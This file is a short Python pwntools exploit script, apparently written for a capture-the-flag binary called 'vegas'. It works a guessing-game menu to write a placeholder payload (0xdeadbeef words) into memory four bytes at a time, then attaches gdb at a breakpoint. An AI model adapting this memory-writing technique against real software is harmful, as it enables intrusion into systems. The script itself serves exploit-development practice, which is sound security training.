#-*- encoding: utf-8 -*- 
from pwn import *
context.binary = './vegas.v1.striped'
context.log_level = 'debug'
context.timeout = None
elf = context.binary

def dbg():
	raw_input()


def guess(score, content):
	p.recvuntil('Choice:\n')
	p.sendline('1')
	p.recvuntil('3. Not sure\n')
	p.sendline('1')
	p.recvline()
	ret = p.recvline()

	if "Wrong" in ret:								#wrong score --
		guess(score-1, content)
		guess(score, content)
	else:											#right buf[score], score ++
		if score >= 0 :
			edit(content[4*score : 4*(score+1)])
		else:
			edit('aaaa')



def edit(content):
	p.recvuntil('step:\n')
	p.sendline(content)

def exploit():

	payload = p32(0xdeadbeef)*0x10
	for i in range(0x10):
		guess(i, payload)

	gdb.attach(p, 'b* 0x080485A0')
	p.interactive()


if __name__ == '__main__':

	p = process('./vegas.v1.striped')
	exploit()
